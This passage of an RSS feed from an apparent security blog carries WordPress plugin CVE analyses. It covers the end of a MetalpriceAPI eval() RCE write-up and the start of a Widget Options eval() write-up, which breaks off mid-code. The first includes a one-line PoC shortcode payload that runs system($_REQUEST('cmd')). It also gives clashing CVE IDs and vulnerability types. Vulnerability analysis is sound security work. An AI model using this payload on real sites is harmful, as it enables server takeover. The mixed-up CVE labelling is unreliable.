Settings:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-12-05-cve-2025-48140/api.png&#34; title=&#34;Enter API key&#34; data-thumbnail=&#34;/posts/2025-12-05-cve-2025-48140/api.png&#34; data-sub-html=&#34;&lt;h2&gt;API&lt;/h2&gt;&lt;p&gt;Enter API key&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-05-cve-2025-48140/api.png&#39; alt=&#34;API&#34; height=&#34;288&#34; width=&#34;925&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Enter API key&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The response will look like:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;&amp;ensp;&amp;ensp;&#34;base&#34;: &#34;USD&#34;,&#xA;&amp;ensp;&amp;ensp;&#34;rates&#34;: {&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;USDXAU&#34;: 4230.2580203577,&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;XAU&#34;: 0.0002363922&#xA;&amp;ensp;&amp;ensp;},&#xA;&amp;ensp;&amp;ensp;&#34;success&#34;: true,&#xA;&amp;ensp;&amp;ensp;&#34;timestamp&#34;: 1764633599&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The response body is decoded into an array using &lt;code&gt;json_decode()&lt;/code&gt;. When the condition&#xA;&lt;code&gt;isset($json[&#39;success&#39;])&amp;ensp;&amp;amp;&amp;amp;&amp;ensp;$json[&#39;success&#39;]&amp;ensp;==&amp;ensp;true&lt;/code&gt; is satisfied and the shortcode provides the &lt;code&gt;operation&lt;/code&gt; parameter, the plugin executes:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$operation&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$attrs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;operation&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$operation&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;str_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;(value)&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$price&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$operation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;$price&amp;ensp;=&amp;ensp;&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$operation&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here, the user-controlled &lt;code&gt;operation&lt;/code&gt; value is passed directly into &lt;code&gt;eval()&lt;/code&gt;, leading to arbitrary PHP code execution. This allows an attacker to inject and execute commands on the server via the &lt;code&gt;operation&lt;/code&gt; parameter in the shortcode.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;pre class=&#34;mermaid&#34;&gt;&#xD;&#xA;graph&amp;ensp;TD&#xD;&#xA;A[&#34;Attacker&amp;ensp;with&amp;ensp;Contributor&amp;ensp;(or&amp;ensp;higher)&amp;ensp;role&#34;]&#xD;&#xA;--&gt;&amp;ensp;B[&#34;Creates&amp;ensp;or&amp;ensp;edits&amp;ensp;a&amp;ensp;post/content&#34;]&#xD;&#xA;--&gt;&amp;ensp;C[&#34;Inserts&amp;ensp;[metalpriceapi&amp;ensp;operation=payload]&#34;]&#xD;&#xA;--&gt;&amp;ensp;D[&#34;WordPress&amp;ensp;renders&amp;ensp;the&amp;ensp;shortcode&#34;]&#xD;&#xA;--&gt;&amp;ensp;E[&#34;Plugin&amp;ensp;executes&amp;ensp;shortcode()&amp;ensp;function&#34;]&#xD;&#xA;--&gt;&amp;ensp;F[&#34;operation&amp;ensp;is&amp;ensp;concatenated&amp;ensp;into&amp;ensp;a&amp;ensp;PHP&amp;ensp;expression&#34;]&#xD;&#xA;--&gt;&amp;ensp;G[&#34;eval()&amp;ensp;executes&amp;ensp;the&amp;ensp;attacker‑controlled&amp;ensp;input&#34;]&#xD;&#xA;--&gt;&amp;ensp;H[&#34;Remote&amp;ensp;Code&amp;ensp;Execution&amp;ensp;(RCE)&amp;ensp;on&amp;ensp;the&amp;ensp;server&#34;]&#xD;&#xA;&lt;/pre&gt;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create a post using a Contributor account&lt;/li&gt;&#xA;&lt;li&gt;Add the shortcode:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[metalpriceapi&amp;ensp;operation=&amp;#39;&amp;#34;abc&amp;#34;;system($_REQUEST(&amp;#34;cmd&amp;#34;));die()&amp;#39;]&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-12-05-cve-2025-48140/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-05-cve-2025-48140/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-05-cve-2025-48140/result.png&#39; alt=&#34;Result&#34; height=&#34;409&#34; width=&#34;1221&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2024-8672 in the WordPress MetalpriceAPI plugin (&amp;lt;= 1.1.4) is a critical RCE vulnerability caused by directly using &lt;code&gt;eval()&lt;/code&gt; with user-controlled input from the &lt;code&gt;operation&lt;/code&gt; parameter in the shortcode. With only Contributor privileges, an attacker can inject and execute arbitrary PHP code on the server, leading to system compromise, data leakage, or malware installation. Version 1.1.5 fixed the issue by removing &lt;code&gt;eval()&lt;/code&gt; and replacing it with a safer expression-handling function.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Never use &lt;code&gt;eval()&lt;/code&gt; with user-supplied input, even indirectly.&lt;/li&gt;&#xA;&lt;li&gt;WordPress shortcodes, if not properly controlled, can become an entry point for RCE.&lt;/li&gt;&#xA;&lt;li&gt;Always validate, sanitize, and strictly restrict allowed characters in input parameters.&lt;/li&gt;&#xA;&lt;li&gt;Use a parser or dedicated handler instead of directly executing dynamic expressions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://vdp.patchstack.com/database/wordpress/plugin/metalpriceapi/vulnerability/wordpress-metalpriceapi-1-1-4-remote-code-execution-rce-vulnerability&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress MetalpriceAPI Plugin &amp;lt;= 1.1.4 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2024-8672 Analysis &amp; PoC</title>
      <link>http://localhost:1313/posts/2025-12-04-cve-2024-8672/</link>
      <pubDate>Thu, 04 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-04-cve-2024-8672/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-04-cve-2024-8672/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;The Widget Options – The #1 WordPress Widget &amp;amp; Block Control Plugin&lt;/strong&gt; for WordPress contains a &lt;strong&gt;Remote Code Execution&lt;/strong&gt; vulnerability in all versions up to and including &lt;strong&gt;4.0.7&lt;/strong&gt; via the &lt;strong&gt;display logic&lt;/strong&gt; feature extended for multiple &lt;strong&gt;page builders&lt;/strong&gt;, because the plugin allows input to pass through &lt;strong&gt;eval()&lt;/strong&gt; without filtering or capability checks, allowing an authenticated attacker with &lt;strong&gt;contributor-level access&lt;/strong&gt; or higher to execute code on the server; although it has been &lt;strong&gt;patched&lt;/strong&gt;, the issue still leaves residual risk as it has not been fully hardened.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2024-8672&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2024-8672&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.0.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.0.8&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/widget-options/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Widget Options Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Widget Options&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.0.7&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.1.3&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v4.0.7):&lt;/strong&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;widgetopts_safe_eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$expression&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ob_start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;bool&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;return&amp;ensp;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$expression&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Throwable&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ob_end_clean&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span 